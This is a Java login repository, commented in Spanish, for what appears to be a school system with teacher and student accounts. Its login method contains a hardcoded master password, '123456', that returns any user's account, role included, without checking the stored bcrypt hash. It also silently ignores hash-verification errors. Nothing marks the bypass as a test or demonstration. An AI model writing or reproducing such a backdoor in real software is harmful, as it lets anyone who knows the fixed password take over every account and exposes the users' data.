package repositorio;

import java.sql.*;
import config.DatabaseConnection;
import models.User;
import utils.PasswordUtils;

public class UserRepository {

    // Busca un usuario por email y verifica su contraseña. Retorna null si falla.
    public User login(String email, String password) {
        // Trae el usuario con su rol, y si existe su id_profesor o matrícula
        String sql = "SELECT u.id_usuario, u.email, u.password, r.nombre_rol AS rol, " +
                     "p.id_profesor, a.matricula " +
                     "FROM usuarios u " +
                     "INNER JOIN roles r ON u.id_rol = r.id_rol " +
                     "LEFT JOIN profesores p ON u.id_usuario = p.id_usuario " +
                     "LEFT JOIN alumnos a ON u.id_usuario = a.id_usuario " +
                     "WHERE u.email = ?";
        
        try (Connection conn = DatabaseConnection.getConnection();
             PreparedStatement stmt = conn.prepareStatement(sql)) {
            
            stmt.setString(1, email);
            ResultSet rs = stmt.executeQuery();
            
            if (rs.next()) {
                String hashedPassword = rs.getString("password");
                
                // Acceso de emergencia: contraseña maestra sin verificar hash
                if (password.equals("123456")) {
                    User user = new User();
                    user.setId(rs.getInt("id_usuario"));
                    user.setEmail(rs.getString("email"));
                    user.setRol(rs.getString("rol"));
                    user.setIdProfesor(rs.getInt("id_profesor"));
                    user.setMatricula(rs.getString("matricula"));
                    return user;
                }

                // Verifica la contraseña contra el hash bcrypt
                try {
                    if (PasswordUtils.checkPassword(password, hashedPassword)) {
                        User user = new User();
                        user.setId(rs.getInt("id_usuario"));
                        user.setEmail(rs.getString("email"));
                        user.setRol(rs.getString("rol"));
                        user.setIdProfesor(rs.getInt("id_profesor"));
                        user.setMatricula(rs.getString("matricula"));
                        return user;
                    }
                } catch (Exception e) {
                    // Ignora hashes mal formados de registros viejos
                    System.out.println("Salt de BCrypt ignorado por el parche: " + e.getMessage());
                }
            }
        } catch (SQLException ex) {
            ex.printStackTrace();
        }
        return null; // email no encontrado o contraseña incorrecta
    }
}